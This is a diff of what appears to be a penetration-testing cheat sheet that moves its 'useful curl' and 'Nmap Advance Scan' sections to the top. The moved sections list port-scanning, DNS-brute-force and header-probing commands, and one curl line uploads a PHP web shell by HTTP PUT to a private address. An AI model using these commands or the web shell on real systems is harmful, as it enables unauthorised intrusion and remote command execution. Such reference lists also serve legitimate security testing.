@@ -1,4 +1,35 @@
 
+### useful curl
+
+```
+nmap -p 443,80 --script http-security-headers
+curl -I -L --url <target domain or IP>
+curl -L http://www.google.com (HTTP Location Headers with -L option)
+curl -I 
+curl -x http://10.10.10.10:8080 -L http://sample.com (Local Proxy)
+curl -v https://google.com (Testing a connection to a remote site)
+curl -I -H 'Accept-Encoding: gzip,deflate' http://example.com/index.php (Checking Header)
+curl -v -X OPTIONS http://192.168.56.103 (Check OPTIONS)
+curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.200.150/1.php
+```
+
+### Nmap Advance Scan
+```
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | grep open
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2 " " $3}'
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}' | wc -l
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}'
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}' > ~/labnet-ip-list.txt
+nmap -p80 --script dns-brute strategicsec.com
+nmap --script http-robtex-reverse-ip secore.info
+nmap -Pn -p80 --script=http-headers strategicsec.com
+nmap -sS -sU -PN -p 1-65535 192.168.0.164(TCP SYN and UDP)
+nmap --script http-methods
+nmap -p 80 --script dns-brute.nse 
+nmap --script http-enum
+ nmap -Pn -p80 --script=http-headers x.x.x.x
+```
+
 ### Oracle Attack Methodology
 
 ```
@@ -56,22 +87,7 @@ exploit/windows/mssql/mssql_payload
 
 ```
 
-### Nmap Advance Scan
-```
-nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | grep open
-nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2 " " $3}'
-nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}' | wc -l
-nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}'
-nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}' > ~/labnet-ip-list.txt
-nmap -p80 --script dns-brute strategicsec.com
-nmap --script http-robtex-reverse-ip secore.info
-nmap -Pn -p80 --script=http-headers strategicsec.com
-nmap -sS -sU -PN -p 1-65535 192.168.0.164(TCP SYN and UDP)
-nmap --script http-methods
-nmap -p 80 --script dns-brute.nse 
-nmap --script http-enum
- nmap -Pn -p80 --script=http-headers x.x.x.x
-```
+
 
 ### VPN Accessment 
 ```
@@ -221,17 +237,7 @@ svmap.py 192.168.1.1-254(Scanning an IP range)
 svmap.py 192.168.1.1-254 --fp(fingerprinting scanning)
 ### http://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP
 ```
-### useful curl
 
-```
-curl -L http://www.google.com (HTTP Location Headers with -L option)
-curl -I 
-curl -x http://10.10.10.10:8080 -L http://sample.com (Local Proxy)
-curl -v https://google.com (Testing a connection to a remote site)
-curl -I -H 'Accept-Encoding: gzip,deflate' http://example.com/index.php (Checking Header)
-curl -v -X OPTIONS http://192.168.56.103 (Check OPTIONS)
-curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.200.150/1.php
-```
 
 ###
 ```
